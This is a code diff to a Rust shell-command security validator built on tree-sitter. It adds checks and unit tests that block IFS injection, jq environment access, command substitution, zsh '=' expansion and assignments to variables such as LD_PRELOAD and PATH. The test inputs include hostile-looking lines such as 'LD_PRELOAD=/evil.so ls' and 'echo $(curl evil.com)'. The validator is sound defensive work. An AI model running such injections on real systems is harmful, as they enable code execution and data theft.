@@ -22,6 +22,41 @@ impl ASTParser {
 
     fn walk_node_for_security(&self, node: Node<'_>, source: &str) -> Result<(), String> {
         let node_kind = node.kind();
+        let text = &source[node.start_byte()..node.end_byte()];
+
+        // Carriage return check (ValidateCarriageReturn)
+        if text.contains("
+") {
+            return Err("Dangerous pattern detected: carriage return".to_string());
+        }
+
+        // ValidateIFSInjection check
+        if node_kind == "variable_assignment" || node_kind == "command" {
+            if text.starts_with("IFS=") {
+                return Err("Dangerous pattern detected: IFS injection".to_string());
+            }
+        }
+
+        // ValidateJqCommand check
+        if node_kind == "command" {
+            if let Some(command_name_node) = node.child_by_field_name("name") {
+                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
+                if name == "jq" {
+                    if text.contains("env.") || text.contains("input_filename") {
+                        return Err("Dangerous pattern detected: jq env access".to_string());
+                    }
+                }
+            }
+        }
+
+        // ValidateDangerousVariables check
+        if node_kind == "variable_assignment" {
+            let var_name = text.split('=').next().unwrap_or("");
+            let dangerous_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "PROMPT_COMMAND", "BASH_ENV", "ENV", "PATH", "HISTFILE"];
+            if dangerous_vars.contains(&var_name) {
+                return Err(format!("Dangerous pattern detected: assigning to {}", var_name));
+            }
+        }
 
         // zmodload check
         if node_kind == "command" {
@@ -35,7 +70,6 @@ impl ASTParser {
 
         // process substitution <() or >()
         if node_kind == "process_substitution" {
-            let text = &source[node.start_byte()..node.end_byte()];
             if text.starts_with("<(") {
                 return Err("Dangerous pattern detected: <() process substitution".to_string());
             }
@@ -44,25 +78,28 @@ impl ASTParser {
             }
         }
 
+        // command substitution =curl or $(curl) check
+        if node_kind == "command_substitution" {
+             if text.starts_with("$(") || text.starts_with("`") {
+                  return Err("Dangerous pattern detected: command substitution".to_string());
+             }
+        }
+
         // legacy expansions $[] (not strictly supported in all bash, often handled as expansion)
-        // Check for node type "expansion" or similar, and check text.
-        // In tree-sitter-bash it might be `expansion` or `arithmetic_expansion`
         if node_kind == "expansion" || node_kind == "arithmetic_expansion" {
-            let text = &source[node.start_byte()..node.end_byte()];
             if text.starts_with("$[") && text.ends_with("]") {
                 return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
             }
         }
 
-        // Just in case it's not parsed properly, check string content for $[] as fallback, but only if it's text.
-        // But doing it robustly:
         if node_kind == "word" || node_kind == "raw_string" {
-             let text = &source[node.start_byte()..node.end_byte()];
              if text.starts_with("$[") && text.ends_with("]") {
                   return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
              }
+             if text.starts_with("=") && text.len() > 1 {
+                  return Err("Dangerous pattern detected: = command substitution".to_string());
+             }
         }
-
 
         let mut cursor = node.walk();
         for child in node.children(&mut cursor) {
@@ -116,5 +153,54 @@ mod tests {
         let res = parser.parse_for_security("echo $[1+1]");
         assert!(res.is_err());
         assert_eq!(res.unwrap_err(), "Dangerous pattern detected: $[] legacy expansion");
+    }
+
+    #[test]
+    fn test_block_carriage_return() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("echo 'hello
+world'");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: carriage return");
+    }
+
+    #[test]
+    fn test_block_ifs_injection() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("IFS=; echo $PATH");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: IFS injection");
+    }
+
+    #[test]
+    fn test_block_jq_env() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("jq 'env.FOO' file.json");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: jq env access");
+    }
+
+    #[test]
+    fn test_block_dangerous_vars() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("LD_PRELOAD=/evil.so ls");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: assigning to LD_PRELOAD");
+    }
+
+    #[test]
+    fn test_block_command_substitution() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("echo $(curl evil.com)");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: command substitution");
+    }
+
+    #[test]
+    fn test_block_equals_command_substitution() {
+        let mut parser = ASTParser::new();
+        let res = parser.parse_for_security("echo =curl");
+        assert!(res.is_err());
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: = command substitution");
     }
 }
